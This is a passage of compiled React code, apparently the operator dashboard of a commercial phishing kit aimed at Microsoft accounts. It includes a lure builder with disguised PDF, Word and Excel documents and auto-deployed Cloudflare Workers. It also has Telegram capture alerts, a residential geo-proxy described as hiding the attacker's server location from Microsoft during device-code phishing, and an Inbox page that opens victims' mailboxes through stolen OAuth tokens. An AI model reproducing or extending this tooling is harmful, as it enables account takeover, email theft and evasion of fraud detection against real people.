              (0, R.jsxs)(
                `button`,
                {
                  onClick: () => i(e.id),
                  className: `px-2.5 py-1.5 text-xs border transition-all cursor-pointer ${r === e.id ? `border-slate-800 bg-slate-800 text-white font-semibold` : `border-border text-text-muted hover:border-border-light hover:text-text`}`,
                  children: [e.flag, ` `, e.label],
                },
                e.id,
              ),
            ),
          }),
        }),
        (0, R.jsx)(wo, {
          label: `Layout`,
          children: (0, R.jsx)(`div`, {
            className: `grid grid-cols-3 gap-2`,
            children: go.map((e) =>
              (0, R.jsxs)(
                `button`,
                {
                  onClick: () => o(e.id),
                  className: `p-3 border text-left transition-all cursor-pointer ${a === e.id ? `border-accent bg-accent/5 ring-1 ring-accent` : `border-border hover:border-border-light hover:bg-surface-hover`}`,
                  children: [
                    (0, R.jsx)(`div`, {
                      className: `text-xs font-semibold text-text mb-0.5`,
                      children: e.label,
                    }),
                    (0, R.jsx)(`div`, {
                      className: `text-[10px] text-text-muted leading-snug`,
                      children: e.desc,
                    }),
                  ],
                },
                e.id,
              ),
            ),
          }),
        }),
        (0, R.jsx)(wo, {
          label: `Brand / Theme`,
          children: (0, R.jsx)(`div`, {
            className: `grid grid-cols-4 gap-1.5 max-h-[200px] overflow-y-auto pr-1`,
            children: ho.map((e) =>
              (0, R.jsxs)(
                `button`,
                {
                  onClick: () => c(e.id),
                  className: `p-2 border transition-all cursor-pointer text-left ${s === e.id ? `border-accent bg-accent/5 ring-1 ring-accent` : `border-border hover:border-border-light hover:bg-surface-hover`}`,
                  children: [
                    (0, R.jsxs)(`div`, {
                      className: `flex items-center justify-between`,
                      children: [
                        (0, R.jsx)(`span`, {
                          className: `text-[11px] font-semibold text-text truncate`,
                          children: e.name,
                        }),
                        e.pro &&
                          (0, R.jsx)(`span`, {
                            className: `text-[7px] bg-white text-black px-1 font-extrabold tracking-wider shrink-0 ml-1`,
                            children: `PRO`,
                          }),
                      ],
                    }),
                    (0, R.jsx)(`span`, {
                      className: `text-[9px] text-text-muted`,
                      children: e.desc,
                    }),
                  ],
                },
                e.id,
              ),
            ),
          }),
        }),
        (0, R.jsx)(wo, {
          label: `Domain`,
          children: w
            ? (0, R.jsx)(`div`, {
                className: `text-xs text-text-muted py-2`,
                children: `Loading domains...`,
              })
            : S.length === 0
              ? (0, R.jsx)(`div`, {
                  className: `text-xs text-danger py-2`,
                  children: `No domains available.`,
                })
              : (0, R.jsxs)(`div`, {
                  className: `space-y-2`,
                  children: [
                    (0, R.jsx)(`select`, {
                      value: T,
                      onChange: (e) => {
                        (E(Number(e.target.value)), te(!1), O(``));
                      },
                      className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
                      children: S.map((e, t) =>
                        (0, R.jsxs)(
                          `option`,
                          {
                            value: t,
                            children: [
                              vo(e),
                              e.is_cf_account ? ` [CF account]` : ``,
                              e.is_default ? ` (default)` : ``,
                              e.is_linked_domain ? ` [linked]` : ``,
                              e.is_silo_sub ? ` [silo]` : ``,
                              e.is_worker_domain ? ` [worker]` : ``,
                            ],
                          },
                          `${e.domain}-${e.id}-${t}`,
                        ),
                      ),
                    }),
                    ie?.is_linked_domain &&
                      ie?.has_cf_creds &&
                      (0, R.jsxs)(`label`, {
                        className: `flex items-center gap-2 cursor-pointer select-none`,
                        children: [
                          (0, R.jsx)(`input`, {
                            type: `checkbox`,
                            checked: D,
                            onChange: (e) => te(e.target.checked),
                            className: `accent-active w-3.5 h-3.5`,
                          }),
                          (0, R.jsxs)(`span`, {
                            className: `text-[11px] text-text-muted`,
                            children: [
                              `Auto-generate random subdomain (e.g. `,
                              (0, R.jsxs)(`span`, {
                                className: `font-mono text-text`,
                                children: [`abc123.`, ie ? vo(ie) : ``],
                              }),
                              `)`,
                            ],
                          }),
                        ],
                      }),
                    ie?.is_cf_account &&
                      (0, R.jsxs)(`div`, {
                        children: [
                          (0, R.jsx)(`input`, {
                            type: `text`,
                            value: ne,
                            onChange: (e) => O(e.target.value),
                            placeholder: `Worker name (optional, random if empty)`,
                            className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
                          }),
                          (0, R.jsx)(`p`, {
                            className: `text-[10px] text-text-muted mt-1`,
                            children: `A new CF Worker will be deployed when the lure is created.`,
                          }),
                        ],
                      }),
                  ],
                }),
        }),
        (0, R.jsx)(wo, {
          label: `Details`,
          children: (0, R.jsxs)(`div`, {
            className: `space-y-3`,
            children: [
              (0, R.jsx)(H, {
                label: `Name (optional)`,
                value: l,
                onChange: (e) => u(e.target.value),
                placeholder: `e.g. Invoice Campaign Q2`,
              }),
              (0, R.jsxs)(`div`, {
                className: `grid grid-cols-2 gap-3`,
                children: [
                  (0, R.jsxs)(xa, {
                    label: `Document Type`,
                    value: d,
                    onChange: (e) => f(e.target.value),
                    children: [
                      (0, R.jsx)(`option`, { value: `pdf`, children: `PDF` }),
                      (0, R.jsx)(`option`, { value: `word`, children: `Word` }),
                      (0, R.jsx)(`option`, {
                        value: `excel`,
                        children: `Excel`,
                      }),
                      (0, R.jsx)(`option`, {
                        value: `powerpoint`,
                        children: `PowerPoint`,
                      }),
                    ],
                  }),
                  (0, R.jsx)(H, {
                    label: `Document Title`,
                    value: h,
                    onChange: (e) => g(e.target.value),
                    placeholder: `Shared Document`,
                  }),
                ],
              }),
              (0, R.jsx)(H, {
                label: `Sender Name`,
                value: p,
                onChange: (e) => m(e.target.value),
                placeholder: `Microsoft User`,
              }),
              (0, R.jsx)(H, {
                label: `Exit URL (optional)`,
                value: v,
                onChange: (e) => y(e.target.value),
                placeholder: `https://example.com`,
              }),
            ],
          }),
        }),
        (0, R.jsxs)(`div`, {
          className: `border border-border p-3 bg-bg/50 text-xs text-text-muted space-y-1`,
          children: [
            (0, R.jsxs)(`div`, {
              children: [
                (0, R.jsx)(`span`, {
                  className: `text-text font-semibold`,
                  children: `Summary:`,
                }),
                ` `,
                ho.find((e) => e.id === s)?.name ?? s,
                ` · `,
                go.find((e) => e.id === a)?.label ?? a,
                ` · `,
                _o.find((e) => e.id === r)?.label ?? r,
              ],
            }),
            (0, R.jsxs)(`div`, {
              children: [
                (0, R.jsx)($r, { size: 10, className: `inline mr-1` }),
                S[T] ? vo(S[T]) : `no domain`,
              ],
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `flex gap-2`,
          children: [
            (0, R.jsx)(V, {
              onClick: ae,
              disabled: b || S.length === 0,
              className: `flex-1`,
              children: b ? `Creating...` : k ? `Update Lure` : `Create Lure`,
            }),
            (0, R.jsx)(V, {
              variant: `secondary`,
              onClick: t,
              className: `flex-1`,
              children: `Cancel`,
            }),
          ],
        }),
        k &&
          (0, R.jsx)(`p`, {
            className: `text-[10px] text-text-muted text-center`,
            children: `Update deletes the old lure and creates a fresh one. Stats reset.`,
          }),
      ],
    }),
  });
}
function wo({ label: e, children: t }) {
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsx)(`label`, {
        className: `block text-[10px] text-text-muted uppercase tracking-wider font-bold mb-2`,
        children: e,
      }),
      t,
    ],
  });
}
function To() {
  let e = er((e) => e.user),
    t = er((e) => e.setUser),
    n = z((e) => e.add),
    [r, i] = (0, _.useState)(e?.display_name ?? ``),
    [a, o] = (0, _.useState)(e?.tg_bot_token ?? ``),
    [s, c] = (0, _.useState)(e?.tg_chat_id ?? ``),
    [l, u] = (0, _.useState)(``),
    [d, f] = (0, _.useState)(``),
    [p, m] = (0, _.useState)(!1),
    [h, g] = (0, _.useState)(``),
    [v, y] = (0, _.useState)(0),
    [b, x] = (0, _.useState)(0),
    [S, C] = (0, _.useState)(!1),
    [w, ee] = (0, _.useState)(!1),
    [T, E] = (0, _.useState)(!1),
    [D, te] = (0, _.useState)(!1),
    [ne, O] = (0, _.useState)(``),
    [re, k] = (0, _.useState)(!1);
  ((0, _.useEffect)(() => {
    e &&
      (i(e.display_name ?? ``), o(e.tg_bot_token ?? ``), c(e.tg_chat_id ?? ``));
  }, [e]),
    (0, _.useEffect)(() => {
      e?.role === `admin` &&
        fetch(`/dash/admin/config`, { credentials: `include` })
          .then((e) => e.json())
          .then((e) => {
            (te(e.geo_proxy_enabled === `1`),
              e.geo_proxy_url && O(e.geo_proxy_url));
          })
          .catch(() => {});
    }, [e]));
  async function ie() {
    k(!0);
    try {
      let e = await fetch(`/dash/admin/config`, {
        method: `POST`,
        credentials: `include`,
        headers: { "Content-Type": `application/json` },
        body: JSON.stringify({
          geo_proxy_enabled: D ? `1` : `0`,
          geo_proxy_url: ne,
        }),
      }).then((e) => e.json());
      e.success
        ? n(`Geo-proxy settings saved!`, `success`)
        : n(e.error || `Failed`, `error`);
    } catch {
      n(`Failed`, `error`);
    } finally {
      k(!1);
    }
  }
  (0, _.useEffect)(() => {
    sr()
      .then((e) => {
        (g(e.referral_code), y(e.total_referrals), x(e.bonuses_earned));
      })
      .catch(() => {});
  }, []);
  async function ae() {
    m(!0);
    try {
      (await or({ display_name: r, tg_bot_token: a, tg_chat_id: s }),
        n(`Profile updated`, `success`),
        t(await ar()));
    } catch {
      n(`Failed to save`, `error`);
    } finally {
      m(!1);
    }
  }
  async function A() {
    if (!d || d.length < 6) {
      n(`Password must be at least 6 characters`, `error`);
      return;
    }
    m(!0);
    try {
      (await or({ password: d }),
        n(`Password changed`, `success`),
        u(``),
        f(``));
    } catch {
      n(`Failed to change password`, `error`);
    } finally {
      m(!1);
    }
  }
  function j() {
    (navigator.clipboard.writeText(h), C(!0), setTimeout(() => C(!1), 2e3));
  }
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsx)(`h1`, {
        className: `text-lg font-bold tracking-wider uppercase mb-6`,
        children: `Settings`,
      }),
      (0, R.jsxs)(`div`, {
        className: `grid grid-cols-1 lg:grid-cols-2 gap-4`,
        children: [
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-5`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex items-center gap-2 mb-4`,
                children: [
                  (0, R.jsx)(Hi, { size: 14, className: `text-text-muted` }),
                  (0, R.jsx)(`h3`, {
                    className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                    children: `Account Info`,
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                className: `grid grid-cols-2 gap-x-6 gap-y-3`,
                children: [
                  (0, R.jsx)(Eo, {
                    label: `Username`,
                    value: e?.username ?? ``,
                  }),
                  (0, R.jsx)(Eo, { label: `Role`, value: e?.role ?? `` }),
                  (0, R.jsx)(Eo, {
                    label: `Plan`,
                    value: e?.plan_tier ?? `standard`,
                  }),
                  (0, R.jsx)(Eo, {
                    label: `Expires`,
                    value: e?.subscription_expires?.split(`T`)[0] ?? `N/A`,
                  }),
                ],
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-5`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex items-center gap-2 mb-4`,
                children: [
                  (0, R.jsx)(Oi, { size: 14, className: `text-text-muted` }),
                  (0, R.jsx)(`h3`, {
                    className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                    children: `Two-Factor Authentication`,
                  }),
                ],
              }),
              e?.has_2fa
                ? (0, R.jsxs)(`div`, {
                    className: `space-y-3`,
                    children: [
                      (0, R.jsxs)(`div`, {
                        className: `flex items-center gap-2`,
                        children: [
                          (0, R.jsx)(Ei, {
                            size: 16,
                            className: `text-active`,
                          }),
                          (0, R.jsx)(`span`, {
                            className: `text-sm font-medium text-active`,
                            children: `2FA Enabled`,
                          }),
                        ],
                      }),
                      (0, R.jsx)(`p`, {
                        className: `text-xs text-text-muted`,
                        children: `Your account is protected with TOTP-based two-factor authentication.`,
                      }),
                      (0, R.jsx)(V, {
                        variant: `danger`,
                        size: `sm`,
                        onClick: () => E(!0),
                        children: `Disable 2FA`,
                      }),
                    ],
                  })
                : (0, R.jsxs)(`div`, {
                    className: `space-y-3`,
                    children: [
                      (0, R.jsxs)(`div`, {
                        className: `flex items-center gap-2`,
                        children: [
                          (0, R.jsx)(Di, {
                            size: 16,
                            className: `text-text-muted`,
                          }),
                          (0, R.jsx)(`span`, {
                            className: `text-sm text-text-muted`,
                            children: `2FA Not Enabled`,
                          }),
                        ],
                      }),
                      (0, R.jsx)(`p`, {
                        className: `text-xs text-text-muted`,
                        children: `Add an extra layer of security by enabling two-factor authentication with an authenticator app.`,
                      }),
                      (0, R.jsx)(V, {
                        size: `sm`,
                        onClick: () => ee(!0),
                        children: (0, R.jsxs)(`span`, {
                          className: `flex items-center gap-1.5`,
                          children: [
                            (0, R.jsx)(vi, { size: 12 }),
                            ` Enable 2FA`,
                          ],
                        }),
                      }),
                    ],
                  }),
            ],
          }),
          (0, R.jsx)(Do, {}),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-5`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex items-center gap-2 mb-4`,
                children: [
                  (0, R.jsx)(Dr, { size: 14, className: `text-text-muted` }),
                  (0, R.jsx)(`h3`, {
                    className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                    children: `Profile & Telegram Alerts`,
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                className: `space-y-3`,
                children: [
                  (0, R.jsx)(H, {
                    label: `Display Name`,
                    value: r,
                    onChange: (e) => i(e.target.value),
                  }),
                  (0, R.jsx)(H, {
                    label: `Telegram Bot Token`,
                    value: a,
                    onChange: (e) => o(e.target.value),
                    placeholder: `e.g. 123456:ABC-DEF...`,
                  }),
                  (0, R.jsx)(H, {
                    label: `Telegram Chat ID`,
                    value: s,
                    onChange: (e) => c(e.target.value),
                    placeholder: `Your numeric chat ID`,
                  }),
                  (0, R.jsx)(`p`, {
                    className: `text-[10px] text-text-muted`,
                    children: `Create a bot via @BotFather on Telegram, paste the token above. Send /start to your bot, then get your Chat ID from @userinfobot.`,
                  }),
                  (0, R.jsx)(`div`, {
                    className: `pt-1`,
                    children: (0, R.jsx)(V, {
                      onClick: ae,
                      disabled: p,
                      children: p ? `Saving...` : `Save Changes`,
                    }),
                  }),
                ],
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-5`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex items-center gap-2 mb-4`,
                children: [
                  (0, R.jsx)(ni, { size: 14, className: `text-text-muted` }),
                  (0, R.jsx)(`h3`, {
                    className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                    children: `Change Password`,
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                className: `space-y-3`,
                children: [
                  (0, R.jsx)(H, {
                    label: `New Password`,
                    type: `password`,
                    value: d,
                    onChange: (e) => f(e.target.value),
                    placeholder: `Min 6 characters`,
                  }),
                  (0, R.jsx)(`div`, {
                    className: `pt-1`,
                    children: (0, R.jsx)(V, {
                      onClick: A,
                      disabled: p,
                      children: `Change Password`,
                    }),
                  }),
                ],
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-5 lg:col-span-2`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex items-center gap-2 mb-4`,
                children: [
                  (0, R.jsx)(Qr, { size: 14, className: `text-text-muted` }),
                  (0, R.jsx)(`h3`, {
                    className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                    children: `Referral Program`,
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                className: `flex items-center gap-4 flex-wrap`,
                children: [
                  (0, R.jsxs)(`div`, {
                    className: `flex-1 min-w-[200px]`,
                    children: [
                      (0, R.jsx)(`div`, {
                        className: `text-[10px] text-text-muted uppercase tracking-widest mb-1`,
                        children: `Your Referral Code`,
                      }),
                      (0, R.jsxs)(`div`, {
                        className: `flex items-center gap-2`,
                        children: [
                          (0, R.jsx)(`code`, {
                            className: `bg-bg border border-border px-3 py-2 text-sm font-mono text-text flex-1`,
                            children: h || `Loading...`,
                          }),
                          (0, R.jsx)(`button`, {
                            onClick: j,
                            disabled: !h,
                            className: `p-2 border border-border hover:bg-surface-hover transition-colors cursor-pointer disabled:opacity-40`,
                            children: S
                              ? (0, R.jsx)(jr, {
                                  size: 14,
                                  className: `text-active`,
                                })
                              : (0, R.jsx)(Ur, {
                                  size: 14,
                                  className: `text-text-muted`,
                                }),
                          }),
                        ],
                      }),
                    ],
                  }),
                  (0, R.jsxs)(`div`, {
                    className: `flex gap-6`,
                    children: [
                      (0, R.jsxs)(`div`, {
                        children: [
                          (0, R.jsx)(`div`, {
                            className: `text-[10px] text-text-muted uppercase tracking-widest mb-0.5`,
                            children: `Total Referrals`,
                          }),
                          (0, R.jsx)(`div`, {
                            className: `text-lg font-bold`,
                            children: v,
                          }),
                        ],
                      }),
                      (0, R.jsxs)(`div`, {
                        children: [
                          (0, R.jsx)(`div`, {
                            className: `text-[10px] text-text-muted uppercase tracking-widest mb-0.5`,
                            children: `Bonuses Earned`,
                          }),
                          (0, R.jsx)(`div`, {
                            className: `text-lg font-bold`,
                            children: b,
                          }),
                        ],
                      }),
                    ],
                  }),
                ],
              }),
              (0, R.jsx)(`p`, {
                className: `text-[10px] text-text-muted mt-3`,
                children: `Share your referral code with others. Every 5 referrals earns you a bonus. They enter the code during registration.`,
              }),
            ],
          }),
          e?.role === `admin` &&
            (0, R.jsxs)(`div`, {
              className: `bg-surface border border-border p-5 lg:col-span-2`,
              children: [
                (0, R.jsxs)(`div`, {
                  className: `flex items-center gap-2 mb-4`,
                  children: [
                    (0, R.jsx)($r, { size: 14, className: `text-text-muted` }),
                    (0, R.jsx)(`h3`, {
                      className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                      children: `Geo-Proxy (Device Code Location)`,
                    }),
                  ],
                }),
                (0, R.jsx)(`p`, {
                  className: `text-xs text-text-muted mb-4`,
                  children: `Route device code requests through a residential proxy so Microsoft shows the victim's country instead of your VPS location.`,
                }),
                (0, R.jsxs)(`div`, {
                  className: `flex items-center gap-3 mb-4`,
                  children: [
                    (0, R.jsx)(`span`, {
                      className: `text-xs text-text-muted`,
                      children: `Enable`,
                    }),
                    (0, R.jsx)(`button`, {
                      onClick: () => te(!D),
                      className: `relative inline-block w-12 h-6 rounded-full transition-colors cursor-pointer ${D ? `bg-primary` : `bg-border`}`,
                      children: (0, R.jsx)(`span`, {
                        className: `absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${D ? `left-7` : `left-1`}`,
                      }),
                    }),
                    (0, R.jsx)(`span`, {
                      className: `text-xs font-medium ${D ? `text-active` : `text-text-muted`}`,
                      children: D ? `Active` : `Off`,
                    }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  className: `mb-4`,
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-widest block mb-1`,
                      children: `Proxy URL`,
                    }),
                    (0, R.jsx)(`input`, {
                      type: `text`,
                      value: ne,
                      onChange: (e) => O(e.target.value),
                      placeholder: `socks5://user:pass@geo.infatica.io:10000`,
                      className: `w-full bg-bg border border-border text-text text-xs font-mono px-3 py-2 outline-none focus:border-primary`,
                    }),
                    (0, R.jsxs)(`p`, {
                      className: `text-[10px] text-text-muted mt-1`,
                      children: [
                        `Use `,
                        (0, R.jsx)(`code`, {
                          className: `bg-bg px-1 text-primary`,
                          children: `{cc}`,
                        }),
                        ` as the victim's country code placeholder (e.g. `,
                        (0, R.jsxs)(`code`, {
                          className: `bg-bg px-1 text-[10px]`,
                          children: [
                            `socks5://user-country-`,
                            `{cc}`,
                            `:pass@host:port`,
                          ],
                        }),
                        `)`,
                      ],
                    }),
                  ],
                }),
                (0, R.jsx)(V, {
                  onClick: ie,
                  disabled: re,
                  children: re ? `Saving...` : `Save Geo-Proxy`,
                }),
              ],
            }),
        ],
      }),
      w &&
        (0, R.jsx)(Oo, {
          onClose: () => ee(!1),
          onEnabled: () => {
            (ee(!1),
              ar()
                .then(t)
                .catch(() => {}));
          },
        }),
      T &&
        (0, R.jsx)(ko, {
          onClose: () => E(!1),
          onDisabled: () => {
            (E(!1),
              ar()
                .then(t)
                .catch(() => {}));
          },
        }),
    ],
  });
}
function Eo({ label: e, value: t }) {
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsx)(`div`, {
        className: `text-[10px] text-text-muted uppercase tracking-widest mb-0.5`,
        children: e,
      }),
      (0, R.jsx)(`div`, {
        className: `text-sm text-text font-medium`,
        children: t,
      }),
    ],
  });
}
function Do() {
  let e = er((e) => e.user)?.id ?? 0,
    [t, n] = (0, _.useState)(() => Na(e));
  function r() {
    let r = !t;
    (Pa(e, r), n(r));
  }
  return (0, R.jsxs)(`div`, {
    className: `bg-surface border border-border p-5`,
    children: [
      (0, R.jsxs)(`div`, {
        className: `flex items-center gap-2 mb-4`,
        children: [
          (0, R.jsx)(ei, { size: 14, className: `text-text-muted` }),
          (0, R.jsx)(`h3`, {
            className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
            children: `Learners Mode`,
          }),
        ],
      }),
      (0, R.jsxs)(`div`, {
        className: `flex items-center justify-between`,
        children: [
          (0, R.jsxs)(`div`, {
            className: `flex-1 mr-4`,
            children: [
              (0, R.jsx)(`p`, {
                className: `text-sm text-text-secondary`,
                children: t
                  ? `Learners mode is active`
                  : `Learners mode is off`,
              }),
              (0, R.jsx)(`p`, {
                className: `text-[11px] text-text-muted mt-1`,
                children: `Shows helpful tips and guidance on each page to help you learn the panel features.`,
              }),
            ],
          }),
          (0, R.jsx)(`button`, {
            onClick: r,
            className: `relative w-11 h-6 rounded-full transition-colors cursor-pointer flex-shrink-0 ${t ? `bg-active` : `bg-border`}`,
            children: (0, R.jsx)(`span`, {
              className: `absolute top-0.5 w-5 h-5 bg-white rounded-full transition-transform shadow ${t ? `left-[22px]` : `left-0.5`}`,
            }),
          }),
        ],
      }),
    ],
  });
}
function Oo({ onClose: e, onEnabled: t }) {
  let [n, r] = (0, _.useState)(``),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(``),
    [c, l] = (0, _.useState)(!0),
    [u, d] = (0, _.useState)(!1),
    f = z((e) => e.add);
  (0, _.useEffect)(() => {
    cr()
      .then((e) => {
        (r(e.qr), a(e.secret));
      })
      .catch(() => f(`Failed to setup 2FA`, `error`))
      .finally(() => l(!1));
  }, []);
  async function p() {
    if (!o.trim() || o.trim().length !== 6) {
      f(`Enter a 6-digit code`, `error`);
      return;
    }
    d(!0);
    try {
      let e = await lr(o.trim());
      e.success
        ? (f(`2FA enabled successfully`, `success`), t())
        : f(e.error || `Invalid code`, `error`);
    } catch {
      f(`Verification failed`, `error`);
    } finally {
      d(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Enable 2FA`,
    onClose: e,
    children: c
      ? (0, R.jsx)(`div`, {
          className: `text-sm text-text-muted py-8 text-center`,
          children: `Generating QR code...`,
        })
      : (0, R.jsxs)(`div`, {
          className: `space-y-4`,
          children: [
            (0, R.jsx)(`p`, {
              className: `text-xs text-text-muted`,
              children: `Scan this QR code with your authenticator app (Google Authenticator, Authy, etc.)`,
            }),
            n &&
              (0, R.jsx)(`div`, {
                className: `flex justify-center py-2`,
                children: (0, R.jsx)(`img`, {
                  src: n,
                  alt: `2FA QR Code`,
                  className: `w-48 h-48`,
                }),
              }),
            (0, R.jsxs)(`div`, {
              children: [
                (0, R.jsx)(`div`, {
                  className: `text-[10px] text-text-muted uppercase tracking-widest mb-1`,
                  children: `Manual Key`,
                }),
                (0, R.jsx)(`code`, {
                  className: `block bg-bg border border-border px-3 py-2 text-xs font-mono text-text-secondary break-all`,
                  children: i,
                }),
              ],
            }),
            (0, R.jsx)(H, {
              label: `Verification Code`,
              value: o,
              onChange: (e) => s(e.target.value.replace(/\D/g, ``).slice(0, 6)),
              placeholder: `Enter 6-digit code`,
            }),
            (0, R.jsxs)(`div`, {
              className: `flex gap-2`,
              children: [
                (0, R.jsx)(V, {
                  onClick: p,
                  disabled: u,
                  children: u ? `Verifying...` : `Verify & Enable`,
                }),
                (0, R.jsx)(V, {
                  variant: `ghost`,
                  onClick: e,
                  children: `Cancel`,
                }),
              ],
            }),
          ],
        }),
  });
}
function ko({ onClose: e, onDisabled: t }) {
  let [n, r] = (0, _.useState)(``),
    [i, a] = (0, _.useState)(!1),
    o = z((e) => e.add);
  async function s() {
    if (!n) {
      o(`Password required`, `error`);
      return;
    }
    a(!0);
    try {
      let e = await ur(n);
      e.success
        ? (o(`2FA disabled`, `success`), t())
        : o(e.error || `Failed`, `error`);
    } catch {
      o(`Failed to disable 2FA`, `error`);
    } finally {
      a(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Disable 2FA`,
    onClose: e,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsx)(`p`, {
          className: `text-xs text-text-muted`,
          children: `Enter your password to confirm disabling two-factor authentication.`,
        }),
        (0, R.jsx)(H, {
          label: `Password`,
          type: `password`,
          value: n,
          onChange: (e) => r(e.target.value),
          placeholder: `Your account password`,
        }),
        (0, R.jsxs)(`div`, {
          className: `flex gap-2`,
          children: [
            (0, R.jsx)(V, {
              variant: `danger`,
              onClick: s,
              disabled: i,
              children: i ? `Disabling...` : `Disable 2FA`,
            }),
            (0, R.jsx)(V, { variant: `ghost`, onClick: e, children: `Cancel` }),
          ],
        }),
      ],
    }),
  });
}
function Ao() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(!0),
    [i, a] = (0, _.useState)(``),
    o = z((e) => e.add);
  (0, _.useEffect)(() => {
    Wa()
      .then((e) =>
        t(
          e.filter(
            (e) =>
              e.status === `active` &&
              e.client_id?.toLowerCase().startsWith(`d3590ed6`),
          ),
        ),
      )
      .catch(() => o(`Failed to load tokens`, `error`))
      .finally(() => r(!1));
  }, []);
  function s(e) {
    window.open(`/dash/outlook/${e}`, `_blank`);
  }
  let c = e.filter(
    (e) =>
      !i ||
      e.user_email?.toLowerCase().includes(i.toLowerCase()) ||
      e.user_name?.toLowerCase().includes(i.toLowerCase()),
  );
  return n
    ? (0, R.jsx)(`div`, {
        className: `text-text-muted text-sm py-12 text-center`,
        children: `Loading...`,
      })
    : (0, R.jsxs)(`div`, {
        children: [
          (0, R.jsxs)(`div`, {
            className: `flex items-center justify-between mb-5`,
            children: [
              (0, R.jsxs)(`div`, {
                children: [
                  (0, R.jsx)(`h1`, {
                    className: `text-lg font-bold tracking-wider uppercase`,
                    children: `Inbox`,
                  }),
                  (0, R.jsx)(`p`, {
                    className: `text-xs text-text-muted mt-1`,
                    children: `Only Mailbox-type captures are shown here. Cookies captures cannot access email.`,
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                className: `text-xs text-text-muted`,
                children: [
                  e.length,
                  ` active account`,
                  e.length === 1 ? `` : `s`,
                ],
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `mb-4 relative`,
            children: [
              (0, R.jsx)(xi, {
                size: 14,
                className: `absolute left-3 top-1/2 -translate-y-1/2 text-text-muted`,
              }),
              (0, R.jsx)(`input`, {
                type: `text`,
                placeholder: `Search accounts...`,
                value: i,
                onChange: (e) => a(e.target.value),
                className: `w-full bg-surface border border-border text-text pl-9 pr-3 py-2.5 text-sm focus:outline-none focus:border-border-light transition-colors placeholder:text-text-muted`,
              }),
            ],
          }),
          c.length === 0
            ? (0, R.jsx)(`div`, {
                className: `bg-surface border border-border text-sm text-text-muted py-12 text-center`,
                children: i
                  ? `No accounts matching "${i}"`
                  : `No active Mailbox-type tokens. Create a lure with Capture Mode set to Inbox/Mailbox.`,
              })
            : (0, R.jsx)(`div`, {
                className: `grid gap-2`,
                children: c.map((e) =>
                  (0, R.jsxs)(
                    `button`,
                    {
                      onClick: () => s(e.id),
                      className: `w-full flex items-center gap-4 bg-surface border border-border px-5 py-3.5 hover:bg-surface-hover hover:border-border-light transition-all cursor-pointer group text-left`,
                      children: [
                        (0, R.jsx)(`div`, {
                          className: `w-8 h-8 bg-slate-100 border border-border flex items-center justify-center flex-shrink-0`,
                          children: (0, R.jsx)(di, {
                            size: 14,
                            className: `text-text-muted group-hover:text-slate-900 transition-colors`,
                          }),
                        }),
                        (0, R.jsxs)(`div`, {
                          className: `flex-1 min-w-0`,
                          children: [
                            (0, R.jsx)(`div`, {
                              className: `text-[13px] font-medium text-text truncate`,
                              children: e.user_email,
                            }),
                            (0, R.jsxs)(`div`, {
                              className: `text-[11px] text-text-muted mt-0.5`,
                              children: [
                                e.user_name ?? `—`,
                                ` · Captured `,
                                new Date(e.captured_at).toLocaleDateString(),
                              ],
                            }),
                          ],
                        }),
                        (0, R.jsxs)(`div`, {
                          className: `flex items-center gap-3 flex-shrink-0`,
                          children: [
                            e.country &&
                              (0, R.jsx)(`span`, {
                                className: `text-[11px] text-text-muted`,
                                children: e.country,
                              }),
                            (0, R.jsx)(Kr, {
                              size: 14,
                              className: `text-text-muted group-hover:text-slate-900 transition-colors`,
                            }),
                          ],
                        }),
                      ],
                    },
                    e.id,
                  ),
                ),
              }),
        ],
      });
}
async function jo() {
  return P(`/dash/keywords`);
}
async function Mo(e) {
  return P(`/dash/keywords/add`, { method: `POST`, body: JSON.stringify(e) });
}
async function No(e) {
  return P(`/dash/keywords/${e}/toggle`, { method: `POST` });
}
async function Po(e) {
  return P(`/dash/keywords/${e}/delete`, { method: `POST` });
}
async function Fo(e = 100) {
  return P(`/dash/keywords/alerts?limit=${e}`);
}
async function Io() {
  return P(`/dash/keywords/alerts/clear`, { method: `POST` });
}
function Lo() {
  let [e, t] = (0, _.useState)(`listeners`),
    [n, r] = (0, _.useState)([]),
    [i, a] = (0, _.useState)([]),
    [o, s] = (0, _.useState)(!0),
    [c, l] = (0, _.useState)(!1),
    u = z((e) => e.add);
  ((0, _.useEffect)(() => {
